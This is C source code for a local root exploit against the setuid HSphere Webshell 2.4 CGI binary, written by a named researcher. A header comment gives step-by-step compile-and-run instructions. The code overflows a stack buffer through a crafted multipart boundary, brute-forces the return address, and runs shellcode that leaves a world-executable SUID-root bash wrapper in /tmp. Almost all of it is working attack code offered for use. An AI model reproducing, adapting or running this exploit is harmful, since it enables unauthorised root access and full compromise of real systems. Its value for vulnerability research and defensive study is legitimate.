/*
 * Local r00t exploit for Webshell 2.4 (possibly other versions).
 * Vulnerability found and exploit written by Carl Livitt
 * (carl (@) learningshophull.co.uk).
 *

Exploits a simple stack-based buffer overflow in CGI.C of the
HSphere webshell component which is installed SUID & GUID root
by default.

Uses a bruteforce method to guess the return address on the stack
and the amount of data to overflow the buffer with; this ensures
it works under many different environments. I originally hardcoded
these values, but found that this was unreliable.

Copy this file (webshell-local.c) to /tmp and then:

cd /tmp
gcc -o webshell-local webshell-local.c
cd /path/to/the/webshell/directory
/tmp/webshell-local

That should get you r00t without any messing about.

*/


#include <sys/types.h>
#include <sys/stat.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>

#define EGG_SIZE_START 257
#define EGG_SIZE_END 291
#define RET_ADDR_START 0xbfffe910
#define RET_ADDR_END 0xbfffffff
#define RET_ADDR_INCREMENT 256
#define CONTENT_LENGTH 42
#define SHELLSCRIPT_FILE "/tmp/zz"
#define EXPLOIT_FILE "/tmp/.webshell.txt"
#define ROOT_SHELL "/tmp/rs"
#define WEBSHELL_PROGRAM "./webshell"

void create_shellscript_file();
void make_shellcode();
void make_exploit_buffer();
void setup_environment();
void make_exploit_file();

char shellcode[] =
        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80" // setuid(0)
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/tmp/zz"; // aleph1 execve() of /bin/sh

char sc[1024];
char egg[1024];

char shell_script[]=
        "#!/bin/sh\n"
        "cd /tmp\n"
        "cat << ROOTSHELL > "ROOT_SHELL".c\n"
        "main() { setuid(0);setgid(0);system(\"/bin/bash\");}\n"
        "ROOTSHELL\n"
        "gcc -o "ROOT_SHELL" "ROOT_SHELL".c\n"
        "chown root:root "ROOT_SHELL"*\n"
        "chmod 6777 "ROOT_SHELL"\n"
        "chmod 0666 "ROOT_SHELL".c\n";

char greeting[]="Webshell 2.4 bruteforce exploit for Linux x86 - by Carl Livitt\n";

int EGG_SIZE=EGG_SIZE_START;
unsigned long RET_ADDR=(unsigned long)RET_ADDR_START;
char *env[4];

/*
 * The fun begins here...
 */

main(int argc, char **argv) {
        int brute_force_mode=1, status, pid;
        struct stat s;

        /*
         * Check to see if the exploit has been run before...
         */
        if(stat((char *)ROOT_SHELL,&s)==0) {
                printf("Root shell already exists... executing...\n");
                system(ROOT_SHELL);
                exit(0);
        }

        /*
         * Make sure that the webshell binary can be found
         * and is SUID root
         */
        if(stat(WEBSHELL_PROGRAM, &s)!=0) {
                printf(WEBSHELL_PROGRAM" not found!\n");
                exit(1);
        } else if(!(s.st_mode&S_ISUID)) {
                printf(WEBSHELL_PROGRAM" is not SUID root!\n");
                exit(1);
        }

        /*
         * Start the bruteforce loop...
         */
        printf("%s\nBruteforcing EGG_SIZE and RET_ADDR..", greeting);
        do {
                // setup exploit buffers
                make_shellcode();
                make_exploit_buffer();
                setup_environment();
                make_exploit_file();
                create_shellscript_file();
                printf(".");fflush(stdout);

                // fork and execute the webshell binary, passing it the
                // exploit input.
                if((pid=fork())==0) {
                        system(WEBSHELL_PROGRAM" < "EXPLOIT_FILE" &>/dev/null");
                        exit(0);
                } else {
                        waitpid(pid, &status, 0);
                }

                // If ROOT_SHELL exists, then the exploit was successful.
                // So execute it!
                if(stat((char *)ROOT_SHELL,&s)==0) {
                        printf("\nEntering r00t shell...\n\n");
                        system(ROOT_SHELL);
                        exit(0);
                }

                // The ROOT_SHELL did not exist, so adjust the bruteforce
                // parameters and continue...
                EGG_SIZE++;
                if(EGG_SIZE>EGG_SIZE_END) {
                        RET_ADDR+=RET_ADDR_INCREMENT;
                        if(RET_ADDR>RET_ADDR_END) {
                                printf("Leaving bruteforce mode...\n");
                                brute_force_mode=0;
                        } else {
                                EGG_SIZE=EGG_SIZE_START;
                        }
                }
        } while(brute_force_mode);
        printf("Bruteforce exhausted - EXPLOIT FAILED.\n");
}

/*
 * Creates the file to be used as stdin for webshell.
 */
void make_exploit_file() {
        FILE *fp;

        if((fp=fopen(EXPLOIT_FILE,"w"))==NULL) {
                printf("Could not create exploit file %s\n", EXPLOIT_FILE);
                exit(1);
        }
        fprintf(fp, "--%s\n", egg+CONTENT_LENGTH);
        fprintf(fp, "Content-Disposition: form-data; name=\"TESTNAME\"; filename=\"TESTFILENAME\"\r\n\r\n");
        fclose(fp);
}

/*
 * Create the malicious environment in which webshell will run
 */
void setup_environment() {
        int i;

        unsetenv("S");
        unsetenv("CONTENT_LENGTH");
        unsetenv("REQUEST_METHOD");
        unsetenv("CONTENT_TYPE");
        env[0]=strdup(egg);
        env[1]=strdup(sc);
        env[2]=strdup("CONTENT_LENGTH=261");
        env[3]=strdup("REQUEST_METHOD=POST");
        env[4]=NULL;
        for(i=0;i<4;i++)
                putenv(env[i]);
}

/*
 * It is the 'boundary' section of a multipart/form-data MIME type
 * that overflows the buffer in webshell. This function creates the
 * malicious boundary.
 */
void make_exploit_buffer() {
        int i;

        memset(egg, 0, EGG_SIZE-1);
        memcpy(egg, "CONTENT_TYPE=multipart/form-data boundary=", CONTENT_LENGTH);
        for(i=0;i<EGG_SIZE; i+=4) {
                egg[i+CONTENT_LENGTH]=RET_ADDR&0xff;
                egg[i+CONTENT_LENGTH+1]=(RET_ADDR>>8)&0xff;
                egg[i+CONTENT_LENGTH+2]=(RET_ADDR>>16)&0xff;
                egg[i+CONTENT_LENGTH+3]=(RET_ADDR>>24)&0xff;
        }
        egg[EGG_SIZE+CONTENT_LENGTH-1]='\0';
}

/*
 * Makes a 1024-byte buffer filled with NOPs and shellcode
 */
void make_shellcode() {
        memset(sc, 0x90,1024);
        sc[0]='S';
        sc[1]='=';
        memcpy(sc + 1024 - (strlen(shellcode)+1), shellcode, strlen(shellcode));
        sc[1023]='\0';
}

/*
 * Generate the shellscript that will be executed by the shellcode.
 * By default, it will create a SUID root shell in /tmp
 */
void create_shellscript_file() {
        FILE *fp;

        if((fp=fopen(SHELLSCRIPT_FILE,"w"))==NULL) {
                printf("Could not create %s\n", SHELLSCRIPT_FILE);
                exit(1);
        }
        fprintf(fp, "%s", shell_script);
        fclose(fp);
        chmod(SHELLSCRIPT_FILE, S_IXOTH | S_IROTH | S_IWOTH | S_IXUSR | S_IRUSR | S_IWUSR);
}

